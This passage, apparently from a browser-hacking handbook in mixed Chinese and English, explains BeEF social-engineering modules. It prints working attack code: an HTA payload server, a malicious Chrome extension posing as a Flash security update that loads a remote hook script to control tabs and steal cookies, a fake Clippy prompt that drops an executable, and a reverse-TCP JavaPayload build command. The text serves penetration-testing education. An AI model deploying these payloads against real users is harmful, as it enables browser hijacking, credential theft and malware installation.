
```ruby
before do
  content_type 'application/hta'
end

get "/application.hta" do
  "<script>new ActiveXObject('WScript.Shell')" + 
  ".Run('calc.exe')</script>"
end
end

@routes = {
  "/" => Hta.new
}

@rack_app = Rack::URLMap.new(@routes)

@thin = Thin::Server.new("browserhacker.com", 4000, @rack_app)

Thin::Logging.silent = false

Thin::Logging.debug = true

puts "[#{Time.now}] Thin ready"

@thin.start
```

- 访问 `http://browserhacker.com:4000/application.hta` 将弹出如 Figure 5-17 所示的 HTA 警告对话框：

start figure 

**Figure 5-17:** HTA warning

![c05f017.tif](img/c05f017.png)

end figure 

- 如 Figure 5-17 所示，对话框看起来像是由 Microsoft 开发的，但实际上并非如此。警告对话框没有任何文件来源的提示，这有助于诱导用户点击“允许”按钮。在此情况下，如果用户允许执行，`calc.exe` 将会运行。你可以在 `browserhacker.com` 上查看更高级的攻击示例。

- 为了优化此攻击，自动安装的浏览器扩展可能更为有效，具体取决于情况和目标浏览器。要真正执行负载，需要在目标浏览器中运行以下 JavaScript：

```javascript
grayOut(true);
avpop();
```

- BeEF 包含相同的逻辑，并在其“Fake AV”模块中实现，当执行时，目标会看到类似 Figure 5-18 的内容：

start figure 

**Figure 5-18:** Fake AV pop-up

![c05f018.tif](img/c05f018.png)

end figure 

- BeEF 还有一个“Fake Flash Update”模块，它不再是诱导用户下载可执行文件，而是尝试诱导用户安装恶意浏览器扩展，如 Figure 5-19、Figure 5-20、Figure 5-21 和 Figure 5-22 所示。在此情形下，恶意扩展会部署并执行一个反向 Meterpreter 负载。第 7 章专门讨论扩展，因此这里不再详细展开。

start figure 

**Figure 5-19:** Fake Flash dialog box

![c05f019.tif](img/c05f019.png)

end figure 

- 用户点击“安装”按钮后，Firefox 会显示如 Figure 5-20 所示的警告对话框。

start figure 

**Figure 5-20:** First Firefox warning

![c05f020.tif](img/c05f020.png)

end figure 

- 警告对话框不止这些。如果用户点击“允许”，则会出现如 Figure 5-21 所示的安装确认对话框。

start figure 

**Figure 5-21:** Extension Install dialog box

![c05f021.tif](img/c05f021.png)

end figure 

- 用户点击最终的“Install Now”按钮后，恶意扩展将被安装，随后提示用户重新启动浏览器，如 Figure 5-22 所示。

start figure 

**Figure 5-22:** Restart dialog box

![c05f022.tif](img/c05f022.png)

end figure  

start feature 

* * *

**Firefox Extension Dropper** BeEF 还提供一个名为“Firefox Extension Dropper”的模块，可用于社交工程和红队评估。恶意扩展会在用户允许安装时立即执行内置的二进制文件。正如 Michael Schierl 原先展示的，安装扩展后重新启动浏览器并非必要，因为使用的是已引导的扩展。由于只针对 Firefox 浏览器，你可能希望启用此模块。这样，一旦浏览器被钩住，用户就会立即被提示安装恶意扩展。

* * *

end feature 

As you may have guessed from the previous figures, the module selected is targeting the Firefox browser. Not to worry, we haven’t left all you Chrome fans behind. Lucky for you, the module also comes with an optional payload targeting Chrome.

From Chrome 版本 20 起，你只能从合法的 Google Chrome 商店安装 Chrome 扩展程序，不能再从其他任何地方安装。然而，Luca Carettoni 和 Michele Orrú 的研究发现了一种绕过此限制的方法。他们发现，Google 在将扩展程序放入商店之前并未分析或调查这些扩展是否包含恶意或后门代码。随后，该扩展被用于窃取用户的所有 Cookie（包括标记为 HttpOnly 的 Cookie），从而获取访问 [www.meraki.com](http://www.meraki.com) 云门户的权限。

Figure 5-23 演示了该恶意扩展程序在 Chrome 商店内可用时的行为。

start figure 

**Figure 5-23:** 恶意 Chrome 扩展程序

![c05f023.tif](img/c05f023.png)

end figure 

该恶意 Chrome 扩展程序由几张图片和两个文件组成，即 `manifest.json` 文件和 `background.js` 文件。`manifest.json` 包含以下内容：

```json
{
  "name": "Adobe Flash Player Security Update",
  "manifest_version": 2,
  "version": "11.5.502.149",
  "description":
    "Updates Adobe Flash Player with latest security updates",
  "background": {
    "scripts": ["background.js"]
  },
  "content_security_policy":
  "script-src 'self' 'unsafe-eval' https://browserhacker.com;
    object-src 'self'",
  "icons": {
    "16": "icon16.png",
    "48": "icon48.png",
    "128": "icon128.png"
  },
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "file://*/*",
    "cookies"
  ]
}
```

而 `background.js` 文件包含以下代码：

```javascript
d=document;
e=d.createElement('script');
e.src="https://browserhacker.com/hook.js";
d.body.appendChild(e);
```

`manifest.json` 中的 `background` 字段表明该扩展程序会执行 `background.js` 文件。`background.js` 会在当前文档中创建一个新的 `<script>` 元素，指向 BeEF hook，由于扩展程序在浏览器内部运行且拥有对所有标签页的控制，用户打开 Chrome 后，你即可通过 BeEF 控制浏览器中所有发生的事情。

恶意浏览器扩展程序时常被用于各种恶意目的。最早的媒体报道之一涉及针对 Facebook 巴西用户的恶意 Firefox 和 Chrome 扩展程序。26 想了解更多吗？你将在第 7 章中进一步详细探讨浏览器扩展程序。

### 使用 Clippy

Microsoft 的 Office 助理，通常称为 Clippy，是微软用于 Microsoft Office 的智能帮助工具。它于 1997 年推出，成为了所有不防备的 Office 用户的噩梦——就在用户准备开始输入文档时，讨厌的 Clippy 会弹出一系列问题。Clippy 受到用户（包括微软员工）的大量批评，最终在 Office 2007 被移除。27

Nick Freeman 和 Denis Andzakovic 对 Clippy 的消失感到惋惜，于是他们创建了 “Clippy” 模块。Avery Brooks 在其 “Heretic Clippy” 项目中编写了原始代码，该项目可从 [`clippy.ajbnet.com/`](http://clippy.ajbnet.com/) 获得。生成的 BeEF 模块是一个完全基于 JavaScript 的可配置浏览器 Clippy。默认情况下，该模块会诱骗用户下载可执行文件。

该模块结构高度模块化，允许在部署和使用时具有灵活性。其核心是 Clippy 控制器，定义默认选项并将 Clippy 及其对话框放置在浏览器右下角。在 Clippy 控制器的 `run()` 方法中，你可以添加任意数量的 `HelpText` 对象集合，每个对象在 Clippy 重新启动时会随机弹出。`run()` 方法还会构建并淡入 `ClippyDisplay` 对象。

实现该功能的代码如下：

```javascript
Clippy.prototype.hahaha = function() {
  var div = document.createElement("div");
  var _c = this;
  div.id = "heehee";
  div.style.display = "none";
  div.innerHTML="<iframe src='http://browserhacker.com/calc.exe' 
    width=1 height=1 style='display:none'></iframe>";
  document.body.appendChild(div);
  _c.openBubble("Thanks for using Clippy!");
  setTimeout(function () { _c.killClippy(); }, 5000); 
}
```

`_c.openBubble()` 调用会弹出一个 `PopupDisplay` 对话框，看起来像是 Clippy 的气泡。该函数同时调用 `_c.killClippy()` 结束 Clippy。此逻辑在 Clippy 的 `run()` 方法中通过添加 `HelpText` 对象时被调用，如下所示：

```javascript
var Help = new HelpText("Would you like to update your browser?");
Help.addResponse("Yes",function() { _c.hahaha(); });
Help.addResponse("Not now", function() {
  _c.killClippy();
  setTimeout(function() {
    new Clippy().run();
  }, 5000);
});
this.addHelp(Help,true);
```

`HelpText` 对象 `Help` 包含一个默认问题和两个回答。`Yes` 响应执行前面的 `hahaha()` 函数，而 `Not now` 响应则结束 Clippy，并在 5 秒后重新启动 Clippy。`this.addHelp()` 调用将 `Help` 对象加入 Clippy，使你可以在需要时添加更多问题供 Clippy 使用。你可以在 Figure 5-24 中看到 Clippy 的实际效果。

start figure 

**Figure 5-24:** Clippy 在 acción 中

![c05f024.tif](img/c05f024.png)

end figure 

尽管该模块具备一定的幽默价值，但事实上，有些人可能会真的被 Clippy 对话框中要求更新软件的提示所欺骗。在此情形下，它仍然可以作为一种机制，在受害者电脑上投放可执行文件。

### 使用已签名的 Java Applet

在本章之前，你已经了解了多种诱骗用户执行操作的方法，包括展示假登录框和其他钓鱼尝试，诱导用户泄露敏感信息。另一种常见手段是利用已签名的 Java Applet 诱导用户运行恶意代码，该代码可能拥有超出浏览器权限的权限，例如通过 Java 直接执行系统命令。技术细节在第 8 章更为深入，但社交工程层面的诱骗始终是需要克服的障碍。

BeEF 的 “Java Payload” 模块最初于 2009 年加入，旨在向当前被钩住的浏览会话加载已签名的 Java Applet。该 Applet 具备反向 TCP 连接能力，可通过 BeEF 附加到用户的钩住页面，并在用户授予运行权限后，在目标机器上执行任意命令。正如第 4 章 “绕过 SOP” 中 Java 部分所讨论的那样，Java 仍被许多大型企业广泛使用。即便在 Click to Play 限制的情况下，这些攻击仍对运行完整补丁版本的 Java 用户极具威胁。 Immunity 团队也曾评论称，已签名的 Java Applet 在此类场景中仍被广泛使用。28 Figure 5-25 展示了当用户执行 BeEF 自签名 Java Applet 时可能出现的警告对话框。

start figure 

**Figure 5-25:** 自签名 Java Applet 安全对话框

![c05f025.tif](img/c05f025.png)

end figure 

If the applet is signed with a legitimate code-signing certificate, such as those offered from Symantec or any of the other SSL vendors, the applet will not display a security dialog box to the user. To increase the likelihood that the applet will execute with minimal security warnings, it will be worthwhile to purchase a code-signing certificate. The implications of signing malicious code, for example Windows binaries, were discussed previously in the “Abusing UI Expectations” section.

BeEF relies on Michael Schierl’s JavaPayload, available from [`https://github.com/schierlm/JavaPayload`](https://github.com/schierlm/JavaPayload). After downloading it you need to build the payload for the victim. One of the benefits of using JavaPayload is that you can specify the attack vector you want to use. JavaPayload can be compiled not only as an applet, but also as a generic agent to attach to an existing Java process. More advanced usage, which may come in handy in particular situations, includes an OpenOffice BeanShell macro (written in Java) and a JDWP (Java Debugger Wire Protocol) loader. From the command line, assuming all prerequisites are met, you can build the payload by executing the following:

```bash
java -cp JavaPayload.jar javapayload.builder.AppletJarBuilder ReverseTCP
```
